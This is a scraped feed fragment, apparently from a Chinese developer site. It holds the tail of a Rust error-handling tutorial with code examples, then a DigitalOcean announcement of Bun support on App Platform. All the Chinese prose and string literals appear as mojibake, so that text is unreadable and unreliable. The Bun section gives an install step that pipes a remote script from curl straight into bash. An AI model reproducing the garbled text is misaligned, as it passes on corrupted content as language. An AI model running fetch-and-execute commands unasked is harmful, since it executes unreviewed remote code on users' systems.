<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = <span class="hljs-title function_ invoke__">read_file</span>(<span class="hljs-string">"data.txt"</span>)
        .<span class="hljs-title function_ invoke__">context</span>(<span class="hljs-string">"è¯»å–æ•°æ®æ–‡ä»¶å¤±è´¥"</span>)?;
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">parsed</span> = <span class="hljs-title function_ invoke__">parse_data</span>(&amp;data)
        .<span class="hljs-title function_ invoke__">context</span>(<span class="hljs-string">"è§£ææ•°æ®å¤±è´¥"</span>)?;
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<h3 data-id="heading-25">âŒ è¯¯åŒº 4ï¼šæ··æ·† <code>Option</code> å’Œ <code>Result</code></h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ä¸å¥½ - ç”¨æˆ·ä¸å­˜åœ¨ä¸æ˜¯é”™è¯¯</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_user</span>(id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;User, <span class="hljs-type">String</span>&gt; {
    users.<span class="hljs-title function_ invoke__">get</span>(&amp;id)
        .<span class="hljs-title function_ invoke__">ok_or</span>(<span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨"</span>.<span class="hljs-title function_ invoke__">to_string</span>())
}
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// å¥½ - ä½¿ç”¨ Option</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_user</span>(id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;User&gt; {
    users.<span class="hljs-title function_ invoke__">get</span>(&amp;id).<span class="hljs-title function_ invoke__">cloned</span>()
}

<span class="hljs-comment">// å¦‚æœç¡®å®éœ€è¦é”™è¯¯ä¿¡æ¯</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_user</span>(id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;User, UserError&gt; {
    <span class="hljs-title function_ invoke__">find_user</span>(id)
        .<span class="hljs-title function_ invoke__">ok_or</span>(UserError::<span class="hljs-title function_ invoke__">NotFound</span>(id))
}
</code></pre>
<hr/>
<h2 data-id="heading-26">å®æˆ˜ç¤ºä¾‹</h2>
<h3 data-id="heading-27">ç¤ºä¾‹ 1ï¼šè¯»å–å¹¶è§£æé…ç½®æ–‡ä»¶</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> serde::Deserialize;
<span class="hljs-keyword">use</span> std::fs;

<span class="hljs-meta">#[derive(Deserialize)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    host: <span class="hljs-type">String</span>,
    port: <span class="hljs-type">u16</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">load_config</span>(path: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;Config, <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> std::error::Error&gt;&gt; {
    <span class="hljs-comment">// è¯»å–æ–‡ä»¶</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">content</span> = fs::<span class="hljs-title function_ invoke__">read_to_string</span>(path)
        .<span class="hljs-title function_ invoke__">map_err</span>(|e| <span class="hljs-built_in">format!</span>(<span class="hljs-string">"æ— æ³•è¯»å–é…ç½®æ–‡ä»¶ {}: {}"</span>, path, e))?;
    
    <span class="hljs-comment">// è§£æ JSON</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span>: Config = serde_json::<span class="hljs-title function_ invoke__">from_str</span>(&amp;content)
        .<span class="hljs-title function_ invoke__">map_err</span>(|e| <span class="hljs-built_in">format!</span>(<span class="hljs-string">"é…ç½®æ–‡ä»¶æ ¼å¼é”™è¯¯: {}"</span>, e))?;
    
    <span class="hljs-comment">// éªŒè¯é…ç½®</span>
    <span class="hljs-keyword">if</span> config.port == <span class="hljs-number">0</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(<span class="hljs-string">"ç«¯å£å·ä¸èƒ½ä¸º 0"</span>.<span class="hljs-title function_ invoke__">into</span>());
    }
    
    <span class="hljs-title function_ invoke__">Ok</span>(config)
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">load_config</span>(<span class="hljs-string">"config.json"</span>) {
        <span class="hljs-title function_ invoke__">Ok</span>(config) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æœåŠ¡å™¨é…ç½®: {}:{}"</span>, config.host, config.port);
        }
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; {
            eprintln!(<span class="hljs-string">"é”™è¯¯: {}"</span>, e);
            std::process::<span class="hljs-title function_ invoke__">exit</span>(<span class="hljs-number">1</span>);
        }
    }
}
</code></pre>
<h3 data-id="heading-28">ç¤ºä¾‹ 2ï¼šå¤„ç†å¤šä¸ªå¯èƒ½å¤±è´¥çš„æ“ä½œ</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::io;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_data</span>(input: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">i32</span>, <span class="hljs-type">String</span>&gt; {
    <span class="hljs-comment">// æ­¥éª¤ 1: å»é™¤ç©ºç™½</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">trimmed</span> = input.<span class="hljs-title function_ invoke__">trim</span>();
    <span class="hljs-keyword">if</span> trimmed.<span class="hljs-title function_ invoke__">is_empty</span>() {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(<span class="hljs-string">"è¾“å…¥ä¸èƒ½ä¸ºç©º"</span>.<span class="hljs-title function_ invoke__">to_string</span>());
    }
    
    <span class="hljs-comment">// æ­¥éª¤ 2: è§£ææ•°å­—</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">number</span>: <span class="hljs-type">i32</span> = trimmed
        .<span class="hljs-title function_ invoke__">parse</span>()
        .<span class="hljs-title function_ invoke__">map_err</span>(|_| <span class="hljs-built_in">format!</span>(<span class="hljs-string">"'{}' ä¸æ˜¯æœ‰æ•ˆçš„æ•°å­—"</span>, trimmed))?;
    
    <span class="hljs-comment">// æ­¥éª¤ 3: éªŒè¯èŒƒå›´</span>
    <span class="hljs-keyword">if</span> number &lt; <span class="hljs-number">0</span> || number &gt; <span class="hljs-number">100</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">"æ•°å­— {} è¶…å‡ºèŒƒå›´ [0, 100]"</span>, number));
    }
    
    <span class="hljs-comment">// æ­¥éª¤ 4: å¤„ç†</span>
    <span class="hljs-title function_ invoke__">Ok</span>(number * <span class="hljs-number">2</span>)
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">inputs</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-string">"42"</span>, <span class="hljs-string">"  50  "</span>, <span class="hljs-string">"abc"</span>, <span class="hljs-string">"150"</span>, <span class="hljs-string">""</span>];
    
    <span class="hljs-keyword">for</span> <span class="hljs-variable">input</span> <span class="hljs-keyword">in</span> inputs {
        <span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">process_data</span>(input) {
            <span class="hljs-title function_ invoke__">Ok</span>(result) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"'{}' -&gt; {}"</span>, input, result),
            <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; eprintln!(<span class="hljs-string">"é”™è¯¯: {}"</span>, e),
        }
    }
}
</code></pre>
<h3 data-id="heading-29">ç¤ºä¾‹ 3ï¼šç»„åˆ Option å’Œ Result</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Database</span> {
    users: <span class="hljs-type">Vec</span>&lt;User&gt;,
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> {
    id: <span class="hljs-type">u32</span>,
    name: <span class="hljs-type">String</span>,
    email: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">String</span>&gt;,  <span class="hljs-comment">// é‚®ç®±å¯èƒ½ä¸å­˜åœ¨</span>
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Database</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_user</span>(&amp;<span class="hljs-keyword">self</span>, id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;User&gt; {
        <span class="hljs-keyword">self</span>.users.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|u| u.id == id)
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_user_email</span>(&amp;<span class="hljs-keyword">self</span>, id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; {
        <span class="hljs-comment">// å…ˆæŸ¥æ‰¾ç”¨æˆ·</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">user</span> = <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">find_user</span>(id)
            .<span class="hljs-title function_ invoke__">ok_or_else</span>(|| <span class="hljs-built_in">format!</span>(<span class="hljs-string">"ç”¨æˆ· {} ä¸å­˜åœ¨"</span>, id))?;
        
        <span class="hljs-comment">// å†è·å–é‚®ç®±</span>
        user.email.<span class="hljs-title function_ invoke__">clone</span>()
            .<span class="hljs-title function_ invoke__">ok_or_else</span>(|| <span class="hljs-built_in">format!</span>(<span class="hljs-string">"ç”¨æˆ· {} æ²¡æœ‰è®¾ç½®é‚®ç®±"</span>, id))
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-30">æ€»ç»“</h2>
<h3 data-id="heading-31">æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li><strong>Result å’Œ Option æ˜¯ä½ çš„æœ‹å‹</strong> - æ‹¥æŠ±å®ƒä»¬ï¼Œä¸è¦é€ƒé¿</li>
<li><strong><code>?</code> æ“ä½œç¬¦æ˜¯ç¥å™¨</strong> - è®©é”™è¯¯ä¼ æ’­å˜å¾—ä¼˜é›…</li>
<li><strong>å°‘ç”¨ unwrap()</strong> - é™¤éä½ çœŸçš„ç¡®å®šä¸ä¼šå¤±è´¥</li>
<li><strong>é€‰æ‹©åˆé€‚çš„é”™è¯¯ç±»å‹</strong> - Option vs Result vs panic!</li>
<li><strong>æ·»åŠ é”™è¯¯ä¸Šä¸‹æ–‡</strong> - å¸®åŠ©æœªæ¥çš„è‡ªå·±è°ƒè¯•</li>
<li><strong>ä½¿ç”¨ç¤¾åŒºå·¥å…·</strong> - thiserror å’Œ anyhow å¾ˆé¦™</li>
</ol>
<h3 data-id="heading-32">å­¦ä¹ è·¯å¾„</h3>
<ol>
<li><strong>åˆçº§ï¼š</strong> ç†Ÿç»ƒä½¿ç”¨ <code>match</code>ã€<code>unwrap</code>ã€<code>expect</code></li>
<li><strong>ä¸­çº§ï¼š</strong> æŒæ¡ <code>?</code> æ“ä½œç¬¦å’Œ <code>Option</code>/<code>Result</code> çš„æ–¹æ³•</li>
<li><strong>é«˜çº§ï¼š</strong> åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯ç±»å‹ï¼Œä½¿ç”¨ thiserror/anyhow</li>
<li><strong>ä¸“å®¶ï¼š</strong> ç†è§£é”™è¯¯è½¬æ¢ã€trait objectsã€é”™è¯¯ä¼ æ’­çš„æœ€ä½³å®è·µ</li>
</ol>
<h3 data-id="heading-33">æ¨èèµ„æº</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdoc.rust-lang.org%2Fbook%2Fch09-00-error-handling.html" title="https://doc.rust-lang.org/book/ch09-00-error-handling.html" target="_blank" ref="nofollow noopener noreferrer">Rust Book - Error Handling</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdoc.rust-lang.org%2Frust-by-example%2Ferror.html" title="https://doc.rust-lang.org/rust-by-example/error.html" target="_blank" ref="nofollow noopener noreferrer">Rust by Example - Error Handling</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.rs%2Fthiserror%2F" title="https://docs.rs/thiserror/" target="_blank" ref="nofollow noopener noreferrer">thiserror crate</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.rs%2Fanyhow%2F" title="https://docs.rs/anyhow/" target="_blank" ref="nofollow noopener noreferrer">anyhow crate</a></li>
</ul>
<hr/>
<p>è®°ä½ï¼š<strong>åœ¨ Rust ä¸­ï¼Œå¤„ç†é”™è¯¯ä¸æ˜¯è´Ÿæ‹…ï¼Œè€Œæ˜¯è®©ä½ çš„ä»£ç æ›´å¥å£®çš„æœºä¼šï¼</strong> ğŸ¦€âœ¨</p>
<p>Happy Coding! ğŸ‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŠ é€Ÿ JavaScript å¼€å‘ï¼šDigitalOcean åº”ç”¨æ‰˜ç®¡ç°å·²åŸç”Ÿæ”¯æŒ Bun]]></title>    <link>https://juejin.cn/post/7589126217234251782</link>    <guid>https://juejin.cn/post/7589126217234251782</guid>    <pubDate>2025-12-29T07:27:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217234251782" data-draft-id="7588827110505971755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŠ é€Ÿ JavaScript å¼€å‘ï¼šDigitalOcean åº”ç”¨æ‰˜ç®¡ç°å·²åŸç”Ÿæ”¯æŒ Bun"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-29T07:27:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DigitalOcean"/> <meta itemprop="url" content="https://juejin.cn/user/2031553217827127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŠ é€Ÿ JavaScript å¼€å‘ï¼šDigitalOcean åº”ç”¨æ‰˜ç®¡ç°å·²åŸç”Ÿæ”¯æŒ Bun
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2031553217827127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DigitalOcean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:27:42.000Z" title="Mon Dec 29 2025 07:27:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>JavaScript ç”Ÿæ€æ­£å¿«é€Ÿæ¼”è¿›ï¼Œä»¥æ»¡è¶³ç°ä»£ AI é©±åŠ¨åº”ç”¨åœ¨æ€§èƒ½å’Œé›†æˆæ–¹é¢æ—¥ç›Šå¢é•¿çš„éœ€æ±‚ã€‚Bun æ˜¯å¼€å‘è€…ä¸­é¢‡å—æ¬¢è¿çš„æ¡†æ¶ï¼Œå®ƒæŠŠè¿è¡Œæ—¶ã€æ‰“åŒ…å™¨å’ŒåŒ…ç®¡ç†å™¨åˆè€Œä¸ºä¸€ï¼Œè¢«è§†ä¸º Node.js çš„â€œå¼€ç®±å³ç”¨â€æ›¿ä»£å“ã€‚å‡­å€Ÿæ¯”ä¼ ç»Ÿè¿è¡Œæ—¶æ›´å¿«çš„å¯åŠ¨é€Ÿåº¦å’Œæ›´ä½çš„å†…å­˜å ç”¨ï¼ŒBun æˆä¸º DigitalOcean å®¢æˆ·å‘¼å£°æœ€é«˜çš„åŠŸèƒ½ä¹‹ä¸€ã€‚</p>
<p>DigitalOcean åº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰ç°å·²åŸç”Ÿæ”¯æŒ Bunã€‚ç°åœ¨ï¼Œæ‚¨æ— éœ€ç¼–å†™ä»»ä½•é…ç½®å³å¯ç›´æ¥ä»ä»£ç ä»“åº“éƒ¨ç½² Bun åº”ç”¨ã€‚åº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰çš„äº‘åŸç”Ÿ Buildpack ä¼šè‡ªåŠ¨æ£€æµ‹ã€æ„å»ºã€éƒ¨ç½²å¹¶è¿è¡Œæ‚¨çš„ Bun åº”ç”¨ã€‚</p>
<h2 data-id="heading-0">ä¸»è¦ä¼˜åŠ¿</h2>
<ul>
<li>â€‹<strong>æ€§èƒ½</strong>â€‹ï¼šBun æ˜¯ç°ä»£é«˜æ€§èƒ½ JavaScript è¿è¡Œæ—¶ï¼Œå†…ç½®å·¥å…·é“¾ï¼Œé’ˆå¯¹å¿«é€Ÿå¯åŠ¨ä¸é«˜æ•ˆæ‰§è¡Œåšäº†ä¼˜åŒ–ã€‚</li>
<li>â€‹<strong>é›¶é…ç½®</strong>â€‹ï¼šæ— éœ€ç»´æŠ¤ Dockerfileï¼Œåªè¦æŠŠä»£ç æ¨é€åˆ° Git ä»“åº“ï¼Œå‰©ä¸‹çš„è¿è¡Œæ—¶è®¾ç½®ç”±æˆ‘ä»¬å®Œæˆã€‚</li>
<li>â€‹<strong>Next.js æ— ç¼æ”¯æŒ</strong>â€‹ï¼šBun ä¸ Next.js åŸç”Ÿå…¼å®¹ï¼Œå¯åŒæ ·è½»æ¾åœ°éƒ¨ç½²å…¨æ ˆ React åº”ç”¨ã€‚</li>
</ul>
<h2 data-id="heading-1">åº”ç”¨æ‰˜ç®¡æœåŠ¡ä¸­çš„ä¸‰ç§éƒ¨ç½²è·¯å¾„</h2>
<ol>
<li>â€‹**äº‘åŸç”Ÿ Buildpackï¼ˆâ€œä»£ç ä¼˜å…ˆâ€ï¼‰**â€‹ï¼šè¿æ¥ GitHub/GitLab/Bitbucket ä»“åº“ï¼Œæˆ‘ä»¬è‡ªåŠ¨åˆ†æä»£ç ã€è¯†åˆ«è¯­è¨€å¹¶å®Œæˆæ„å»ºã€‚</li>
<li>â€‹<strong>Dockerfile</strong>â€‹ï¼šåœ¨ä»“åº“ä¸­æ”¾ç½® Dockerfileï¼Œæˆ‘ä»¬æŒ‰æ‚¨çš„æŒ‡ä»¤æ„å»ºé•œåƒã€‚</li>
<li>â€‹<strong>é¢„æ„å»ºé•œåƒ</strong>â€‹ï¼šæœ¬åœ°æ„å»ºå®¹å™¨é•œåƒå¹¶æ¨é€åˆ° DigitalOcean å®¹å™¨æ³¨å†Œè¡¨ï¼ˆDOCRï¼‰ï¼Œæˆ‘ä»¬éƒ¨ç½²æ‚¨æ¨é€çš„ exact é•œåƒã€‚</li>
</ol>
<h2 data-id="heading-2">å¦‚ä½•å¼€å§‹ä½¿ç”¨ Bun</h2>
<p>å¦‚æœä½ åˆšæ¥è§¦ Bunï¼Œä¸Šæ‰‹éå¸¸ç®€å•ã€‚Bun è¢«è®¾è®¡ä¸º Node.js çš„â€œå³æ’å³ç”¨â€æ›¿ä»£å“ï¼Œé€šå¸¸åªéœ€æå°‘æ”¹åŠ¨å³å¯æ²¿ç”¨ç°æœ‰ä»£ç å’Œ package.jsonã€‚</p>
<p>â€‹<strong>å®‰è£… Bun</strong>â€‹ï¼šåœ¨æœ¬åœ°å…¨å±€å®‰è£… Bunï¼Œå³å¯å¿«é€Ÿå®Œæˆç¯å¢ƒæ­å»ºã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">curl -fsSL https:<span class="hljs-comment">//bun.sh/install | bash</span>
</code></pre>
<p>è¿è¡Œåº”ç”¨ï¼šä½¿ç”¨ <code>bun install</code> å¿«é€Ÿå®‰è£…ä¾èµ–ï¼ˆå°±åƒ Node.js ä¸‹çš„ <code>npm install</code>ï¼‰ï¼Œå†ç”¨ <code>bun run</code> æ‰§è¡Œè„šæœ¬å³å¯ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">bun install      # å®‰è£…ä¾èµ–ï¼Œç±»ä¼¼ npm install
bun run dev      # æ‰§è¡Œè„šæœ¬ï¼Œç±»ä¼¼ npm run dev
</code></pre>
<p>æ·±å…¥çš„æ›´å¤šç”¨æ³•è¯·å‚è€ƒ <a href="https://link.juejin.cn?target=https%3A%2F%2Fbun.sh%2Fdocs" target="_blank" title="https://bun.sh/docs" ref="nofollow noopener noreferrer">Bun å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<h2 data-id="heading-3">Bun çš„è‡ªåŠ¨æ£€æµ‹æœºåˆ¶</h2>
<p>å½“ä½ åœ¨æœ¬åœ°åˆå§‹åŒ–é¡¹ç›®å¹¶ç¡®ä¿è¿è¡Œæ­£å¸¸åï¼Œåº”ç”¨æ‰˜ç®¡æœåŠ¡ï¼ˆApp Platformï¼‰ä¼šè‡ªåŠ¨è¯†åˆ«ä¸º Bun åº”ç”¨ã€‚æ„å»ºç³»ç»Ÿé€šè¿‡æ‰«æä»£ç ä»“åº“æ ¹ç›®å½•æ¥åˆ¤æ–­æ‰€éœ€è¿è¡Œç¯å¢ƒã€‚</p>
<p><strong>å¦‚ä½•è¯†åˆ« Bun åº”ç”¨</strong></p>
<p>åªè¦åœ¨ä»£ç ä»“åº“ä¸­å‘ç°è¿™ä¸ªé”å®šæ–‡ä»¶ï¼Œç³»ç»Ÿå°±ä¼šç¡®è®¤ä½ æ­£åœ¨ä½¿ç”¨ Bunï¼šbun.lock</p>
<p>æ£€æµ‹åˆ° Bun åº”ç”¨åï¼Œè‡ªåŠ¨æ„å»ºæµç¨‹å¦‚ä¸‹ï¼š</p>
<p>1ã€â€‹<strong>å®‰è£…ä¾èµ–</strong>â€‹ï¼šè‡ªåŠ¨æ‰§è¡Œ bun install å®‰è£…ä¾èµ–ï¼ˆå¦‚æœ bun.lock æ–‡ä»¶æ²¡å˜ï¼Œç³»ç»Ÿä¼šç›´æ¥ä½¿ç”¨ç¼“å­˜çš„ node_modulesï¼Œå¤§å¹…ç¼©çŸ­æ„å»ºæ—¶é—´ï¼‰</p>
<p>2ã€â€‹<strong>æ‰§è¡Œæ„å»º</strong>â€‹ï¼šè¿è¡Œ bun run build è¿›è¡Œæ„å»ºã€‚ä½ ä¹Ÿå¯ä»¥åœ¨ App Spec é‡Œè‡ªå®šä¹‰ build_command æ¥è¦†ç›–è¿™ä¸ªæ­¥éª¤ã€‚å¦‚æœéœ€è¦åœ¨å®‰è£…ä¾èµ–å‰åæ‰§è¡Œå…¶ä»–æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨ package.json é‡Œçš„ digitalocean-prebuild å’Œ digitalocean-postbuild è„šæœ¬</p>
<p>3ã€â€‹<strong>å¯åŠ¨åº”ç”¨</strong>â€‹ï¼šé»˜è®¤é€šè¿‡ bun run start å¯åŠ¨åº”ç”¨</p>
